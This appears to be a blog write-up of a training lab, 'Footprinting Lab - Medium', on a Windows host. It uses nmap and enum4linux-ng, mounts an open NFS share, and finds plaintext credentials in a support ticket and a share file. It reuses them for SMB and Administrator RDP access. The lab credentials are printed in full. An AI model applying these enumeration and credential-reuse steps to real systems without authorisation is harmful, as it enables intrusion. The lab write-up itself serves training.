[Main Page](/index)

---

# Footprinting Lab - Medium

---

> This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.
Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named HTB has been created. Accordingly, we need to obtain the credentials of this user as proof.

---

So we need to enumerate the machine to find a way in, and submit the dummy inforpationf for the account `HTB`.
Let's start with an nmap! That's always a good idea

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-06 15:14 EST
Host is up, received conn-refused (0.067s latency).
Scanned at 2024-12-06 15:14:05 EST for 81s

PORT     STATE SERVICE       REASON  VERSION
111/tcp  open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-06T20:14:56+00:00
| ssl-cert: Subject: commonName=WINMEDIUM
| Issuer: commonName=WINMEDIUM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-05T19:01:24
| Not valid after:  2025-06-06T19:01:24
| MD5:   723e 2cff 7db2 9aa9 2b6c 1375 e9d9 e8ce
| SHA-1: c2e8 6eb2 1195 f962 5d46 3cd5 fd7e e992 7476 d3db
| -----BEGIN CERTIFICATE-----
| MIIC1jCCAb6gAwIBAgIQdSmTAOJUhrNAnxrWfi7QVTANBgkqhkiG9w0BAQsFADAU
| MRIwEAYDVQQDEwlXSU5NRURJVU0wHhcNMjQxMjA1MTkwMTI0WhcNMjUwNjA2MTkw
| MTI0WjAUMRIwEAYDVQQDEwlXSU5NRURJVU0wggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQDDhyydxUHRtdbViPc9rnB4o4uNXcbfMq5qrP5yQ/j78vHCO2tB
| bOhO9ooA65YQtz7pbCHw8+0jzR3NA3GMhRZh6cDUYAZQJx73WkA0Uxz0R1srN4oT
| yNiSnNr6S1BAGYCfY9VfF8g2vrhgWUjHfxyCcLUGChS0g2X5d8Bj9eNFs6pozJEN
| vjCu75AAPNmw2p4pYGHUvXP7jH9rIkzWN/haNxteZmt5gAJu+A6XeI3G0yw/3wVk
| LruoRhv7cVHiQfeYB7ijSCj1mdy/kqCnXV2fhdLGbhusO5UtWZgQP+pvpehAkTIj
| IvvWZE4lgIKKI0GnQ8Vaux/f/AuB3OsY2VUlAgMBAAGjJDAiMBMGA1UdJQQMMAoG
| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAdxFPZ7C+
| 0Jiq++Y00TiORTGr+o4Bvl0X2/ampQ6G7TmKJ+xWTIPnKlF+1OAhDowML4QdJ7jG
| YeJ6OfOwfYZy8oXx0Y80KLIUSfGqZy/RlpGaveUaab2pFDdxkMj8tIe+Ko3xb2jb
| Zxz/dmDRcZWHeuE5uGULEODG+zoaV+iXd7wvznVmVq05MJ59Udbre5nRwky5rw7i
| hVkL9vQeypY3OI2p3SsBSSnDayKoOEpNKfDzQGUZIKe1BT0QC0N8werrq/TtH7kp
| MdOIKxABa/4Z5qQbqt0+Gg1c8zaImw9ENLvQkqpfL1uUe7Tm5TbEznzqEdeWgL+l
| uCNuk2bAYq4bdg==
|_-----END CERTIFICATE-----
|_ssl-date: 2024-12-06T20:15:04+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39122/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 23483/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29247/udp): CLEAN (Timeout)
|   Check 4 (port 27631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-06T20:14:59
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:15
Completed NSE at 15:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:15
Completed NSE at 15:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:15
Completed NSE at 15:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.33 seconds
```

So it looks like a windows machine running NFS, SMB, and RDP. Let's start with enumerating SMB.

```
$ ./enum4linux-ng.py 10.129.103.28 -A
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.103.28
[*] Username ......... ''
[*] Random Username .. 'cbwlkxny'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.103.28    |
 ======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.103.28    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.103.28    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 ============================================================
|    Domain Information via SMB session for 10.129.103.28    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: WINMEDIUM
NetBIOS domain name: ''
DNS domain: WINMEDIUM
FQDN: WINMEDIUM
Derived membership: workgroup member
Derived domain: unknown

 ==========================================
|    RPC Session Check on 10.129.103.28    |
 ==========================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 ================================================
|    OS Information via RPC for 10.129.103.28    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 7.68 seconds
```

Doesn't look like we got much from this. We can also try some more scanning with nmap.

```
$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.129.103.28
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-06 15:24 EST
Nmap scan report for 10.129.103.28
Host is up (0.058s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-06T20:24:11+00:00

Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds
```

Doesn't look like SMB is giving us much to work with, so let's switch gears and test NFS.   NFS stands for Network File Shares. Let's run some another scan with nmap.

```
$ nmap --script nfs-ls -p111,2049 10.129.245.121
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-06 18:01 EST
Nmap scan report for 10.129.245.121
Host is up (0.061s latency).

PORT     STATE SERVICE
111/tcp  open  rpcbind
| nfs-ls: Volume /TechSupport
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
| rwx------   4294967294  4294967294  65536  2021-11-11T00:09:49  .
| ??????????  ?           ?           ?      ?                    ..
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283649.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283650.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283651.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283652.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283653.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283654.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:29  ticket4238791283655.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:29  ticket4238791283656.txt
|_
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
```

It looks like we can access a share with some support tickets from this `TechSupport` file share. We can mount the file share with the following commands:

```
mkdir target-NFS
sudo mount -t nfs <ip>:/ ./target-NFS/ -o nolock
```

After snooping around these files one of them sticks out to me.

```
$ cat ticket4238791283782.txt
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17    	withUserNameSupport=false
18    	sendWelcomeEmail=true
19    	enableGravatarSupport=true
20    	signupSkipLogin=true
21    	tokenDuration=60
22    	tokenDeleteInterval=5
23    	minimumPasswordLength=8
24    	enableTokenJob=true
25    	hasher=bcrypt
26	}
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   



---
```

This gives us a bunch of information we can use as attackers like users, and FQDN of an email server, and most importantly login creds. `alex:lol123!mD`
Let's try these on SMB!

```
$ smbclient -U 'alex' -L //10.129.245.121
Password for [WORKGROUP\alex]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	devshare        Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      
SMB1 disabled -- no workgroup available
```

It works! We can now list some shares. But can we read them? That `Users` share looks intriguing.

```
$ smbclient -U 'alex' //10.129.245.121/devshare
Password for [WORKGROUP\alex]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 10 11:12:22 2021
  ..                                  D        0  Wed Nov 10 11:12:22 2021
  important.txt                       A       16  Wed Nov 10 11:12:55 2021

		6367231 blocks of size 4096. 2593093 blocks available
smb: \>
```

Interesting! Let's download it and read it!

```
$ cat important.txt 
sa:87N1ns@slls83
```

Looks like we have potential administrative credentials! But first let's see if our `alex` user can RDP into the machine.

```
xfreerdp /u:alex /p:'lol123!mD' /v:10.129.213.48
```

![rdp img](/assets/rdp-alex.png)

I tried to login to the MSSQL Management service, as that's where out `HTB` account is, but we failed to login with our found creds.
![sql img failed](/assets/sql-fail.png)

Well let's try logging into RDP as the `administrator` instead of `alex`.

```
xfreerdp /u:Administrator /p:'87N1ns@slls83' /v:10.129.217.19
```

![rdp adm](/assets/rdp-adm.png)
![sql db](/assets/sql-db.png)

It works!

![sql list](/assets/sql-list.png)
![sql htb](/assets/sql-htb.png)

And we can find the HTB password in our **accounts** database.
And with that, this box is solved!

